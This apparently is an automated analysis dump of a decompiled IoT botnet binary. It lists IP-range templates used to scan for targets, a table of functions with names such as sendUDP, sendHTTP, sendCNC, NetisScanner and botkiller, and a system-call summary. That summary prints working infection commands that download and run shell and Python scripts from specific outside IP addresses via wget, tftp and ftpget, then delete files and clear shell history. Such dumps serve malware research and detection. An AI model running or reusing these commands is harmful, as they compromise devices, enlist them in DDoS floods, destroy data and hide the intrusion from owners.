        szprintf((int32_t)&v103, (int32_t)"1.188.%d.%d", (int32_t)v96, (int32_t)v97, (int32_t)&v104);

        szprintf((int32_t)&v103, (int32_t)"14.204.%d.%d", (int32_t)v96, (int32_t)v97, (int32_t)&v104);

        szprintf((int32_t)&v103, (int32_t)"27.0.%d.%d", (int32_t)v96, (int32_t)v97, (int32_t)&v104);

        szprintf((int32_t)&v103, (int32_t)"27.8.%d.%d", (int32_t)v96, (int32_t)v97, (int32_t)&v104);

        szprintf((int32_t)&v103, (int32_t)"27.50.%d.%d", (int32_t)v96, (int32_t)v97, (int32_t)&v104);

        szprintf((int32_t)&v103, (int32_t)"27.54.%d.%d", (int32_t)v96, (int32_t)v97, (int32_t)&v104);

        szprintf((int32_t)&v103, (int32_t)"27.98.%d.%d", (int32_t)v96, (int32_t)v97, (int32_t)&v104);

        szprintf((int32_t)&v103, (int32_t)"27.112.%d.%d", (int32_t)v96, (int32_t)v97, (int32_t)&v104);

        szprintf((int32_t)&v103, (int32_t)"27.192.%d.%d", (int32_t)v96, (int32_t)v97, (int32_t)&v104);

        szprintf((int32_t)&v103, (int32_t)"36.32.%d.%d", (int32_t)v96, (int32_t)v97, (int32_t)&v104);

        szprintf((int32_t)&v103, (int32_t)"36.248.%d.%d", (int32_t)v96, (int32_t)v97, (int32_t)&v104);

        szprintf((int32_t)&v103, (int32_t)"39.64.%d.%d", (int32_t)v96, (int32_t)v97, (int32_t)&v104);

        szprintf((int32_t)&v103, (int32_t)"42.4.%d.%d", (int32_t)v96, (int32_t)v97, (int32_t)&v104);

        szprintf((int32_t)&v103, (int32_t)"42.48.%d.%d", (int32_t)v96, (int32_t)v97, (int32_t)&v104);

        szprintf((int32_t)&v103, (int32_t)"42.52.%d.%d", (int32_t)v96, (int32_t)v97, (int32_t)&v104);

        szprintf((int32_t)&v103, (int32_t)"42.56.%d.%d", (int32_t)v96, (int32_t)v97, (int32_t)&v104);

        szprintf((int32_t)&v103, (int32_t)"42.63.%d.%d", (int32_t)v96, (int32_t)v97, (int32_t)&v104);

        szprintf((int32_t)&v103, (int32_t)"42.84.%d.%d", (int32_t)v96, (int32_t)v97, (int32_t)&v104);

        szprintf((int32_t)&v103, (int32_t)"42.176.%d.%d", (int32_t)v96, (int32_t)v97, (int32_t)&v104);

        szprintf((int32_t)&v103, (int32_t)"42.224.%d.%d", (int32_t)v96, (int32_t)v97, (int32_t)&v104);

        szprintf((int32_t)&v103, (int32_t)"42.176.%d.%d", (int32_t)v96, (int32_t)v97, (int32_t)&v104);

        szprintf((int32_t)&v103, (int32_t)"60.0.%d.%d", (int32_t)v96, (int32_t)v97, (int32_t)&v104);

        szprintf((int32_t)&v103, (int32_t)"60.16.%d.%d", (int32_t)v96, (int32_t)v97, (int32_t)&v104);

        szprintf((int32_t)&v103, (int32_t)"163.53.%d.%d", (int32_t)v96, (int32_t)v97, (int32_t)&v104);

        szprintf((int32_t)&v103, (int32_t)"62.30.%d.%d", (int32_t)v96, (int32_t)v97, (int32_t)&v104);

        szprintf((int32_t)&v103, (int32_t)"62.252.%d.%d", (int32_t)v96, (int32_t)v97, (int32_t)&v104);

        szprintf((int32_t)&v103, (int32_t)"62.254.%d.%d", (int32_t)v96, (int32_t)v97, (int32_t)&v104);

        szprintf((int32_t)&v103, (int32_t)"62.255.%d.%d", (int32_t)v96, (int32_t)v97, (int32_t)&v104);

        szprintf((int32_t)&v103, (int32_t)"77.96.%d.%d", (int32_t)v96, (int32_t)v97, (int32_t)&v104);

        szprintf((int32_t)&v103, (int32_t)"77.97.%d.%d", (int32_t)v96, (int32_t)v97, (int32_t)&v104);

        szprintf((int32_t)&v103, (int32_t)"77.98.%d.%d", (int32_t)v96, (int32_t)v97, (int32_t)&v104);

        szprintf((int32_t)&v103, (int32_t)"77.100.%d.%d", (int32_t)v96, (int32_t)v97, (int32_t)&v104);

        szprintf((int32_t)&v103, (int32_t)"77.102.%d.%d", (int32_t)v96, (int32_t)v97, (int32_t)&v104);

        szprintf((int32_t)&v103, (int32_t)"113.191.%d.%d", (int32_t)v96, (int32_t)v97, (int32_t)&v104);

        szprintf((int32_t)&v103, (int32_t)"81.100.%d.%d", (int32_t)v96, (int32_t)v97, (int32_t)&v104);

        szprintf((int32_t)&v103, (int32_t)"113.188.%d.%d", (int32_t)v96, (int32_t)v97, (int32_t)&v104);

        szprintf((int32_t)&v103, (int32_t)"113.189.%d.%d", (int32_t)v96, (int32_t)v97, (int32_t)&v104);

        szprintf((int32_t)&v103, (int32_t)"94.174.%d.%d", (int32_t)v96, (int32_t)v97, (int32_t)&v104);

        szprintf((int32_t)&v103, (int32_t)"14.160.%d.%d", (int32_t)v96, (int32_t)v97, (int32_t)&v104);

        szprintf((int32_t)&v103, (int32_t)"14.161.%d.%d", (int32_t)v96, (int32_t)v97, (int32_t)&v104);

        szprintf((int32_t)&v103, (int32_t)"14.162.%d.%d", (int32_t)v96, (int32_t)v97, (int32_t)&v104);

        szprintf((int32_t)&v103, (int32_t)"14.163.%d.%d", (int32_t)v96, (int32_t)v97, (int32_t)&v104);

        szprintf((int32_t)&v103, (int32_t)"14.164.%d.%d", (int32_t)v96, (int32_t)v97, (int32_t)&v104);

        szprintf((int32_t)&v103, (int32_t)"14.165.%d.%d", (int32_t)v96, (int32_t)v97, (int32_t)&v104);

        szprintf((int32_t)&v103, (int32_t)"14.166.%d.%d", (int32_t)v96, (int32_t)v97, (int32_t)&v104);

        szprintf((int32_t)&v103, (int32_t)"14.167.%d.%d", (int32_t)v96, (int32_t)v97, (int32_t)&v104);

        szprintf((int32_t)&v103, (int32_t)"14.168.%d.%d", (int32_t)v96, (int32_t)v97, (int32_t)&v104);

        szprintf((int32_t)&v103, (int32_t)"14.169.%d.%d", (int32_t)v96, (int32_t)v97, (int32_t)&v104);

        szprintf((int32_t)&v103, (int32_t)"14.170.%d.%d", (int32_t)v96, (int32_t)v97, (int32_t)&v104);

        szprintf((int32_t)&v103, (int32_t)"14.171.%d.%d", (int32_t)v96, (int32_t)v97, (int32_t)&v104);

        szprintf((int32_t)&v103, (int32_t)"14.172.%d.%d", (int32_t)v96, (int32_t)v97, (int32_t)&v104);

        szprintf((int32_t)&v103, (int32_t)"14.173.%d.%d", (int32_t)v96, (int32_t)v97, (int32_t)&v104);

        szprintf((int32_t)&v103, (int32_t)"14.174.%d.%d", (int32_t)v96, (int32_t)v97, (int32_t)&v104);

        szprintf((int32_t)&v103, (int32_t)"14.175.%d.%d", (int32_t)v96, (int32_t)v97, (int32_t)&v104);

        szprintf((int32_t)&v103, (int32_t)"14.176.%d.%d", (int32_t)v96, (int32_t)v97, (int32_t)&v104);

        szprintf((int32_t)&v103, (int32_t)"14.177.%d.%d", (int32_t)v96, (int32_t)v97, (int32_t)&v104);

        szprintf((int32_t)&v103, (int32_t)"14.178.%d.%d", (int32_t)v96, (int32_t)v97, (int32_t)&v104);

        szprintf((int32_t)&v103, (int32_t)"14.179.%d.%d", (int32_t)v96, (int32_t)v97, (int32_t)&v104);

        szprintf((int32_t)&v103, (int32_t)"14.180.%d.%d", (int32_t)v96, (int32_t)v97, (int32_t)&v104);

        szprintf((int32_t)&v103, (int32_t)"14.181.%d.%d", (int32_t)v96, (int32_t)v97, (int32_t)&v104);

        szprintf((int32_t)&v103, (int32_t)"14.182.%d.%d", (int32_t)v96, (int32_t)v97, (int32_t)&v104);

        szprintf((int32_t)&v103, (int32_t)"14.183.%d.%d", (int32_t)v96, (int32_t)v97, (int32_t)&v104);

        szprintf((int32_t)&v103, (int32_t)"14.184.%d.%d", (int32_t)v96, (int32_t)v97, (int32_t)&v104);

        szprintf((int32_t)&v103, (int32_t)"14.185.%d.%d", (int32_t)v96, (int32_t)v97, (int32_t)&v104);

        szprintf((int32_t)&v103, (int32_t)"14.186.%d.%d", (int32_t)v96, (int32_t)v97, (int32_t)&v104);

        szprintf((int32_t)&v103, (int32_t)"14.187.%d.%d", (int32_t)v96, (int32_t)v97, (int32_t)&v104);

        szprintf((int32_t)&v103, (int32_t)"14.188.%d.%d", (int32_t)v96, (int32_t)v97, (int32_t)&v104);

        szprintf((int32_t)&v103, (int32_t)"14.189.%d.%d", (int32_t)v96, (int32_t)v97, (int32_t)&v104);

        szprintf((int32_t)&v103, (int32_t)"14.190.%d.%d", (int32_t)v96, (int32_t)v97, (int32_t)&v104);

        szprintf((int32_t)&v103, (int32_t)"14.191.%d.%d", (int32_t)v96, (int32_t)v97, (int32_t)&v104);

        szprintf((int32_t)&v103, (int32_t)"45.121.%d.%d", (int32_t)v96, (int32_t)v97, (int32_t)&v104);

        szprintf((int32_t)&v103, (int32_t)"45.120.%d.%d", (int32_t)v96, (int32_t)v97, (int32_t)&v104);

        szprintf((int32_t)&v103, (int32_t)"45.115.%d.%d", (int32_t)v96, (int32_t)v97, (int32_t)&v104);

        szprintf((int32_t)&v103, (int32_t)"43.252.%d.%d", (int32_t)v96, (int32_t)v97, (int32_t)&v104);

        szprintf((int32_t)&v103, (int32_t)"43.230.%d.%d", (int32_t)v96, (int32_t)v97, (int32_t)&v104);

        szprintf((int32_t)&v103, (int32_t)"43.240.%d.%d", (int32_t)v96, (int32_t)v97, (int32_t)&v104);

        szprintf((int32_t)&v103, (int32_t)"43.245.%d.%d", (int32_t)v96, (int32_t)v97, (int32_t)&v104);

        szprintf((int32_t)&v103, (int32_t)"41.174.%d.%d", (int32_t)v96, (int32_t)v97, (int32_t)&v104);

        szprintf((int32_t)&v103, (int32_t)"49.118.%d.%d", (int32_t)v96, (int32_t)v97, (int32_t)&v104);

        szprintf((int32_t)&v103, (int32_t)"78.188.%d.%d", (int32_t)v96, (int32_t)v97, (int32_t)&v104);

        szprintf((int32_t)&v103, (int32_t)"45.127.%d.%d", (int32_t)v96, (int32_t)v97, (int32_t)&v104);

        szprintf((int32_t)&v103, (int32_t)"103.30.%d.%d", (int32_t)v96, (int32_t)v97, (int32_t)&v104);

        szprintf((int32_t)&v103, (int32_t)"14.33.%d.%d", (int32_t)v96, (int32_t)v97, (int32_t)&v104);

        szprintf((int32_t)&v103, (int32_t)"123.16.%d.%d", (int32_t)v96, (int32_t)v97, (int32_t)&v104);

        szprintf((int32_t)&v103, (int32_t)"202.44.%d.%d", (int32_t)v96, (int32_t)v97, (int32_t)&v104);

        szprintf((int32_t)&v103, (int32_t)"116.93.%d.%d", (int32_t)v96, (int32_t)v97, (int32_t)&v104);

        szprintf((int32_t)&v103, (int32_t)"91.83.%d.%d", (int32_t)v96, (int32_t)v97, (int32_t)&v104);

        szprintf((int32_t)&v103, (int32_t)"41.253.%d.%d", (int32_t)v96, (int32_t)v97, (int32_t)&v104);

        szprintf((int32_t)&v103, (int32_t)"117.173.%d.%d", (int32_t)v96, (int32_t)v97, (int32_t)&v104);

        szprintf((int32_t)&v103, (int32_t)"113.190.%d.%d", (int32_t)v96, (int32_t)v97, (int32_t)&v104);

        szprintf((int32_t)&v103, (int32_t)"146.88.%d.%d", (int32_t)v96, (int32_t)v97, (int32_t)&v104);

        szprintf((int32_t)&v103, (int32_t)"112.196.%d.%d", (int32_t)v96, (int32_t)v97, (int32_t)&v104);

        szprintf((int32_t)&v103, (int32_t)"113.178.%d.%d", (int32_t)v96, (int32_t)v97, (int32_t)&v104);

        szprintf((int32_t)&v103, (int32_t)"112.45.%d.%d", (int32_t)v96, (int32_t)v97, (int32_t)&v104);

        szprintf(v105, (int32_t)"183.223.%d.%d", (int32_t)v96, (int32_t)v97, (int32_t)&v104);

    szprintf(v103, (int32_t)"%d.%d.%d.%d", (int32_t)v104, (int32_t)v97, (int32_t)v99);

        __libc_system((int32_t)"cd /tmp || cd /var/run || cd /dev/shm || cd /mnt || cd /var;rm -f *;wget http://207.148.12.91/shitty.sh; chmod 777 shitty.sh; sh shitty.sh; tftp 207.148.12.91 -c get shtftp1.sh; chmod 777 shtftp1.sh; sh shtftp1.sh; tftp -r shtftp2.sh -g 207.148.12.91; chmod 777 shtftp2.sh; sh shtftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 207.148.12.91 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf shitty.sh shtftp1.sh shtftp2.sh ftp1.sh; rm -rf *; history -c");

            ClearHistory(__libc_system((int32_t)"sudo yum install python-paramiko -y;sudo apt-get install python-paramiko -y;sudo mkdir /.tmp/;cd /.tmp;wget 207.148.12.91/good2.py"));

            ClearHistory(__libc_system((int32_t)"cd /.tmp;rm -rf *py;wget 207.148.12.91/good2.py"));

    inet_addr((int32_t)"8.8.8.8");

================================================================================
========	SYSTEM CALLS SUMMARY : ================================================
================================================================================
    char (*v76)[507] = "cd /tmp || cd /var/system || cd /mnt || cd /lib;rm -f /tmp/* || /var/run/* || /var/system/* || /mnt/* || /lib/*;cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://45.32.213.61/bins.sh; chmod 777 bins.sh; sh bins.sh; tftp 207.148.12.91 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 207.148.12.91; chmod 777 tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 207.148.12.91 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf bins.sh tftp1.sh tftp2.sh ftp1.sh; rm -rf *\r\n";

            __libc_system(v98);

            __libc_system(v98);

    __libc_system((int32_t)"history -c;history -w");

    __libc_system((int32_t)"cd /root;rm -rf .bash_history");

    return __libc_system((int32_t)"cd /var/tmp; rm -f *");

        __libc_system((int32_t)"cd /tmp || cd /var/run || cd /dev/shm || cd /mnt || cd /var;rm -f *;wget http://207.148.12.91/shitty.sh; chmod 777 shitty.sh; sh shitty.sh; tftp 207.148.12.91 -c get shtftp1.sh; chmod 777 shtftp1.sh; sh shtftp1.sh; tftp -r shtftp2.sh -g 207.148.12.91; chmod 777 shtftp2.sh; sh shtftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 207.148.12.91 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf shitty.sh shtftp1.sh shtftp2.sh ftp1.sh; rm -rf *; history -c");

            ClearHistory(__libc_system((int32_t)"sudo yum install python-paramiko -y;sudo apt-get install python-paramiko -y;sudo mkdir /.tmp/;cd /.tmp;wget 207.148.12.91/good2.py"));

            ClearHistory(__libc_system((int32_t)"cd /.tmp;rm -rf *py;wget 207.148.12.91/good2.py"));

            ClearHistory(__libc_system((int32_t)"killall -9 python;pkill python"));

            ClearHistory(__libc_system((int32_t)"cd /.tmp;python good2.py 1000 LUCKY 1 3"));

int32_t __libc_system(int32_t a1) {

================================================================================
========	FUNCTIONS LIST : =======================================================
================================================================================
FUNCTION_NAME                                     |ARGS|LENGH   |SUSPCET_INSTRC|WHILE_INSTRC|
----------------------------------------------------------------------------------------------
processCmd                                        |2   |5147    |549           |727         |
----------------------------------------------------------------------------------------------
_init                                             |0   |925     |163           |0           |
----------------------------------------------------------------------------------------------
GetRandomPublicIP                                 |4   |800     |121           |0           |
----------------------------------------------------------------------------------------------
main                                              |0   |712     |85            |495         |
----------------------------------------------------------------------------------------------
__dns_lookup                                      |4   |750     |52            |588         |
----------------------------------------------------------------------------------------------
fdpopen                                           |2   |406     |38            |0           |
----------------------------------------------------------------------------------------------
_fpmaxtostr                                       |6   |3821    |35            |3428        |
----------------------------------------------------------------------------------------------
__uClibc_main                                     |7   |1514    |34            |775         |
----------------------------------------------------------------------------------------------
sendTCP                                           |7   |353     |33            |128         |
----------------------------------------------------------------------------------------------
prints                                            |5   |525     |30            |36          |
----------------------------------------------------------------------------------------------
StartTheLelz                                      |2   |685     |28            |540         |
----------------------------------------------------------------------------------------------
sendUDP                                           |8   |302     |26            |93          |
----------------------------------------------------------------------------------------------
_ppfs_parsespec                                   |1   |1035    |23            |907         |
----------------------------------------------------------------------------------------------
malloc                                            |1   |2833    |21            |1436        |
----------------------------------------------------------------------------------------------
gethostbyname_r                                   |0   |435     |19            |0           |
----------------------------------------------------------------------------------------------
_memcpy                                           |2   |1829    |18            |732         |
----------------------------------------------------------------------------------------------
getOurIP                                          |0   |242     |17            |103         |
----------------------------------------------------------------------------------------------
__open_nameservers                                |0   |395     |17            |127         |
----------------------------------------------------------------------------------------------
gethostbyname2_r                                  |7   |366     |15            |79          |
----------------------------------------------------------------------------------------------
_stdio_fopen                                      |0   |966     |13            |0           |
----------------------------------------------------------------------------------------------
__read_etc_hosts_r                                |0   |242     |11            |105         |
----------------------------------------------------------------------------------------------
print                                             |3   |387     |11            |266         |
----------------------------------------------------------------------------------------------
getBogos                                          |2   |167     |9             |64          |
----------------------------------------------------------------------------------------------
__GI_inet_ntop                                    |4   |451     |9             |324         |
----------------------------------------------------------------------------------------------
printi                                            |7   |212     |8             |18          |
----------------------------------------------------------------------------------------------
__GI_config_read                                  |4   |464     |8             |349         |
----------------------------------------------------------------------------------------------
negotiate                                         |5   |174     |7             |0           |
----------------------------------------------------------------------------------------------
inet_pton                                         |3   |409     |7             |230         |
----------------------------------------------------------------------------------------------
sendHTTP                                          |6   |158     |7             |40          |
----------------------------------------------------------------------------------------------
sendSTD                                           |4   |138     |7             |23          |
----------------------------------------------------------------------------------------------
nprocessors_onln                                  |0   |170     |6             |46          |
----------------------------------------------------------------------------------------------
NetisRanges                                       |0   |111     |6             |0           |
----------------------------------------------------------------------------------------------
recvLine                                          |4   |219     |6             |84          |
----------------------------------------------------------------------------------------------
__GI_memchr                                       |4   |276     |6             |144         |
----------------------------------------------------------------------------------------------
realloc                                           |2   |391     |6             |0           |
----------------------------------------------------------------------------------------------
getCores                                          |1   |124     |6             |19          |
----------------------------------------------------------------------------------------------
NetisScanner                                      |1   |113     |6             |10          |
----------------------------------------------------------------------------------------------
memrchr                                           |4   |249     |6             |128         |
----------------------------------------------------------------------------------------------
UpdateBins                                        |1   |112     |6             |0           |
----------------------------------------------------------------------------------------------
fdpclose                                          |1   |157     |6             |26          |
----------------------------------------------------------------------------------------------
_vfprintf_internal                                |3   |894     |5             |766         |
----------------------------------------------------------------------------------------------
fflush_unlocked                                   |2   |232     |5             |52          |
----------------------------------------------------------------------------------------------
sendCNC                                           |4   |115     |4             |0           |
----------------------------------------------------------------------------------------------
__aeabi_idiv                                      |2   |512     |4             |228         |
----------------------------------------------------------------------------------------------
srandom_r                                         |2   |180     |4             |47          |
----------------------------------------------------------------------------------------------
readUntil                                         |8   |193     |4             |80          |
----------------------------------------------------------------------------------------------
socket_connect                                    |2   |135     |4             |0           |
----------------------------------------------------------------------------------------------
__udivsi3                                         |2   |453     |4             |212         |
----------------------------------------------------------------------------------------------
getcwd                                            |2   |294     |4             |0           |
----------------------------------------------------------------------------------------------
strncpy                                           |3   |203     |4             |88          |
----------------------------------------------------------------------------------------------
strstr                                            |2   |253     |4             |136         |
----------------------------------------------------------------------------------------------
connectTimeout                                    |4   |161     |3             |0           |
----------------------------------------------------------------------------------------------
botkiller                                         |1   |120     |3             |18          |
----------------------------------------------------------------------------------------------
_ppfs_setargs                                     |0   |268     |3             |109         |
----------------------------------------------------------------------------------------------
listFork                                          |0   |131     |3             |20          |
----------------------------------------------------------------------------------------------
__GI_wcsnrtombs                                   |5   |276     |3             |67          |
----------------------------------------------------------------------------------------------
sockprintf                                        |2   |108     |3             |0           |
----------------------------------------------------------------------------------------------
initConnection                                    |0   |133     |3             |0           |
----------------------------------------------------------------------------------------------
strnlen                                           |2   |264     |3             |93          |
----------------------------------------------------------------------------------------------
_stdio_term                                       |1   |177     |3             |57          |
----------------------------------------------------------------------------------------------
__GI_strchrnul                                    |4   |194     |3             |71          |
----------------------------------------------------------------------------------------------
ClearHistory                                      |1   |102     |3             |0           |
----------------------------------------------------------------------------------------------
__GI_strchr                                       |2   |222     |3             |100         |
----------------------------------------------------------------------------------------------
trim                                              |1   |160     |3             |39          |
----------------------------------------------------------------------------------------------
__GI_initstate_r                                  |4   |181     |3             |0           |
----------------------------------------------------------------------------------------------
_stdlib_strto_l                                   |0   |450     |3             |348         |
----------------------------------------------------------------------------------------------
contains_string                                   |2   |126     |2             |15          |
----------------------------------------------------------------------------------------------
__libc_system                                     |1   |144     |2             |0           |
----------------------------------------------------------------------------------------------
__GI_strspn                                       |1   |140     |2             |30          |
----------------------------------------------------------------------------------------------
__GI_closedir                                     |1   |130     |2             |0           |
----------------------------------------------------------------------------------------------
_uintmaxtostr                                     |1   |223     |2             |54          |
----------------------------------------------------------------------------------------------
matchPrompt                                       |1   |169     |2             |62          |
----------------------------------------------------------------------------------------------
strcasestr                                        |3   |148     |2             |46          |
----------------------------------------------------------------------------------------------
__GI_strpbrk                                      |2   |127     |2             |26          |
----------------------------------------------------------------------------------------------
__GI_vfprintf                                     |3   |148     |2             |0           |
----------------------------------------------------------------------------------------------
__GI_fclose                                       |1   |164     |2             |0           |
----------------------------------------------------------------------------------------------
__GI_fgetc                                        |1   |144     |2             |0           |
----------------------------------------------------------------------------------------------
__GI_memset                                       |2   |226     |2             |74          |
----------------------------------------------------------------------------------------------
__stdio_WRITE                                     |3   |180     |2             |75          |
----------------------------------------------------------------------------------------------
__GI_fgets_unlocked                               |3   |198     |2             |72          |
----------------------------------------------------------------------------------------------
readdir64                                         |1   |146     |2             |36          |
----------------------------------------------------------------------------------------------
rawmemchr                                         |2   |195     |2             |25          |
----------------------------------------------------------------------------------------------
abort                                             |0   |154     |2             |4           |
----------------------------------------------------------------------------------------------
__close_nameservers                               |0   |115     |2             |0           |
----------------------------------------------------------------------------------------------
inet_aton                                         |2   |200     |2             |90          |
----------------------------------------------------------------------------------------------
__aeabi_ddiv                                      |4   |629     |2             |217         |
----------------------------------------------------------------------------------------------
__malloc_consolidate                              |0   |229     |2             |102         |
----------------------------------------------------------------------------------------------
__GI_config_close                                 |1   |115     |2             |0           |
----------------------------------------------------------------------------------------------
srand                                             |1   |108     |1             |0           |
----------------------------------------------------------------------------------------------
strcspn                                           |0   |130     |1             |20          |
----------------------------------------------------------------------------------------------
sclose                                            |1   |107     |1             |0           |
----------------------------------------------------------------------------------------------
__xpg_strerror_r                                  |0   |234     |1             |73          |
----------------------------------------------------------------------------------------------
rand                                              |0   |100     |1             |0           |
----------------------------------------------------------------------------------------------
_promoted_size                                    |0   |124     |1             |17          |
----------------------------------------------------------------------------------------------
__GI_inet_ntoa_r                                  |0   |123     |1             |17          |
----------------------------------------------------------------------------------------------
__GI___uClibc_fini                                |0   |128     |1             |27          |
----------------------------------------------------------------------------------------------
fgets                                             |3   |128     |1             |0           |
----------------------------------------------------------------------------------------------
makeIPPacket                                      |4   |101     |1             |0           |
----------------------------------------------------------------------------------------------
__GI_gethostbyname2                               |0   |105     |1             |0           |
----------------------------------------------------------------------------------------------
__GI_inet_ntoa                                    |1   |109     |1             |0           |
----------------------------------------------------------------------------------------------
__GI_gethostbyname                                |1   |100     |1             |0           |
----------------------------------------------------------------------------------------------
inet_pton4                                        |2   |171     |1             |46          |
----------------------------------------------------------------------------------------------
skip_and_NUL_space                                |1   |140     |1             |33          |
----------------------------------------------------------------------------------------------
__GI_time                                         |1   |109     |1             |0           |
----------------------------------------------------------------------------------------------
__GI_strcasecmp                                   |2   |138     |1             |33          |
----------------------------------------------------------------------------------------------
inet_addr                                         |1   |103     |1             |0           |
----------------------------------------------------------------------------------------------
getdtablesize                                     |0   |101     |1             |0           |
----------------------------------------------------------------------------------------------
__open_etc_hosts                                  |0   |100     |1             |0           |
----------------------------------------------------------------------------------------------
get_telstate_host                                 |3   |101     |1             |0           |
----------------------------------------------------------------------------------------------
__check_one_fd                                    |2   |109     |1             |0           |
----------------------------------------------------------------------------------------------
GetRandomIP                                       |1   |101     |1             |0           |
----------------------------------------------------------------------------------------------
getHost                                           |2   |101     |1             |0           |
----------------------------------------------------------------------------------------------
zprintf                                           |1   |100     |1             |0           |
----------------------------------------------------------------------------------------------
random                                            |0   |109     |1             |0           |
----------------------------------------------------------------------------------------------
fd_to_DIR                                         |2   |129     |1             |0           |
----------------------------------------------------------------------------------------------
__GI_config_open                                  |1   |114     |1             |0           |
----------------------------------------------------------------------------------------------
szprintf                                          |5   |99      |1             |0           |
----------------------------------------------------------------------------------------------
inet_ntop4                                        |3   |150     |1             |45          |
----------------------------------------------------------------------------------------------
__get_hosts_byname_r                              |7   |100     |1             |0           |
----------------------------------------------------------------------------------------------
tcpcsum                                           |2   |106     |1             |0           |
----------------------------------------------------------------------------------------------
__GI_raise                                        |1   |100     |1             |0           |
----------------------------------------------------------------------------------------------
__GI__exit                                        |1   |111     |1             |10          |
----------------------------------------------------------------------------------------------
fdgets                                            |4   |125     |1             |21          |
----------------------------------------------------------------------------------------------
__getdents64                                      |4   |163     |1             |41          |
----------------------------------------------------------------------------------------------
advance_state                                     |2   |107     |1             |0           |
----------------------------------------------------------------------------------------------
sprintf                                           |7   |100     |1             |0           |
----------------------------------------------------------------------------------------------
_stdio_openlist_dec_use                           |0   |178     |1             |40          |
----------------------------------------------------------------------------------------------
read_with_timeout                                 |4   |122     |1             |0           |
----------------------------------------------------------------------------------------------
__GI_fopen                                        |2   |100     |1             |0           |
----------------------------------------------------------------------------------------------
__GI_vsnprintf                                    |0   |132     |1             |0           |
----------------------------------------------------------------------------------------------
__decode_dotted                                   |5   |214     |1             |78          |
----------------------------------------------------------------------------------------------
_ppfs_init                                        |1   |160     |1             |36          |
----------------------------------------------------------------------------------------------
_charpad                                          |3   |125     |1             |17          |
----------------------------------------------------------------------------------------------
__libc_waitpid                                    |3   |102     |1             |0           |
----------------------------------------------------------------------------------------------
isatty                                            |1   |109     |1             |0           |
----------------------------------------------------------------------------------------------
__GI_strcoll                                      |2   |124     |1             |19          |
----------------------------------------------------------------------------------------------
__encode_dotted                                   |1   |215     |1             |69          |
----------------------------------------------------------------------------------------------
parseHex                                          |2   |126     |1             |17          |
----------------------------------------------------------------------------------------------
makeRandomStr                                     |2   |111     |1             |0           |
----------------------------------------------------------------------------------------------
__stdio_trans2w_o                                 |2   |310     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_brk                                          |1   |100     |0             |0           |
----------------------------------------------------------------------------------------------
function_15824                                    |1   |106     |0             |0           |
----------------------------------------------------------------------------------------------
function_17da8                                    |1   |106     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_fwrite_unlocked                              |4   |173     |0             |0           |
----------------------------------------------------------------------------------------------
__libc_connect                                    |3   |110     |0             |0           |
----------------------------------------------------------------------------------------------
__fixunsdfsi                                      |2   |125     |0             |0           |
----------------------------------------------------------------------------------------------
__aeabi_drsub                                     |3   |100     |0             |0           |
----------------------------------------------------------------------------------------------
contains_fail                                     |1   |100     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_fseeko64                                     |0   |231     |0             |0           |
----------------------------------------------------------------------------------------------
getrlimit                                         |2   |110     |0             |0           |
----------------------------------------------------------------------------------------------
_pthread_cleanup_pop_restore                      |2   |110     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_strrchr                                      |4   |125     |0             |0           |
----------------------------------------------------------------------------------------------
calloc                                            |2   |197     |0             |0           |
----------------------------------------------------------------------------------------------
__xstat64_conv                                    |2   |102     |0             |0           |
----------------------------------------------------------------------------------------------
munmap                                            |4   |109     |0             |0           |
----------------------------------------------------------------------------------------------
function_13c5c                                    |1   |106     |0             |0           |
----------------------------------------------------------------------------------------------
read_until_response                               |4   |109     |0             |0           |
----------------------------------------------------------------------------------------------
__adddf3                                          |4   |330     |0             |0           |
----------------------------------------------------------------------------------------------
__GI___fcntl_nocancel                             |3   |109     |0             |0           |
----------------------------------------------------------------------------------------------
contains_success                                  |1   |100     |0             |0           |
----------------------------------------------------------------------------------------------
contains_response                                 |1   |106     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_setsockopt                                   |5   |110     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_write                                        |2   |109     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_read                                         |1   |109     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_close                                        |1   |109     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_fputs                                        |2   |130     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_poll                                         |6   |110     |0             |0           |
----------------------------------------------------------------------------------------------
function_16354                                    |2   |107     |0             |0           |
----------------------------------------------------------------------------------------------
init_rand                                         |1   |107     |0             |0           |
----------------------------------------------------------------------------------------------
function_17a38                                    |1   |110     |0             |0           |
----------------------------------------------------------------------------------------------
__malloc_largebin_index                           |1   |114     |0             |0           |
----------------------------------------------------------------------------------------------
function_14b24                                    |1   |106     |0             |0           |
----------------------------------------------------------------------------------------------
function_1cdac                                    |9   |224     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_getpagesize                                  |0   |108     |0             |0           |
----------------------------------------------------------------------------------------------
getuid                                            |0   |101     |0             |0           |
----------------------------------------------------------------------------------------------
getgid                                            |1   |101     |0             |0           |
----------------------------------------------------------------------------------------------
__div0                                            |0   |100     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_tcgetattr                                    |0   |112     |0             |0           |
----------------------------------------------------------------------------------------------
__libc_send                                       |4   |110     |0             |0           |
----------------------------------------------------------------------------------------------
function_13aec                                    |1   |106     |0             |0           |
----------------------------------------------------------------------------------------------
_call_via_r5                                      |0   |103     |0             |0           |
----------------------------------------------------------------------------------------------
function_12a30                                    |1   |106     |0             |0           |
----------------------------------------------------------------------------------------------
_call_via_r4                                      |0   |103     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_sbrk                                         |1   |151     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_exit                                         |1   |129     |0             |0           |
----------------------------------------------------------------------------------------------
function_15bd8                                    |1   |106     |0             |0           |
----------------------------------------------------------------------------------------------
__GI___sigismember                                |2   |101     |0             |0           |
----------------------------------------------------------------------------------------------
rand_cmwc                                         |0   |104     |0             |0           |
